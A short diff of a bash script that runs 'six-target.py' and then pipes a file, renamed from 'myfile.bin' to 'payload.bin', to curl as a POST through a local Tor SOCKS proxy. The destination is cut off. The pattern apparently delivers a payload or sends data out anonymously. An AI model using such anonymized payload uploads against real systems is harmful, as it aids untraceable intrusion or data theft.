@@ -1,7 +1,7 @@
 #!/bin/bash
 python3 six-target.py
 
-cat myfile.bin | curl --trace - \
+cat payload.bin | curl --trace - \
 	-X POST \
 	--socks5-hostname localhost:9050 \
 	--data-binary  @- \
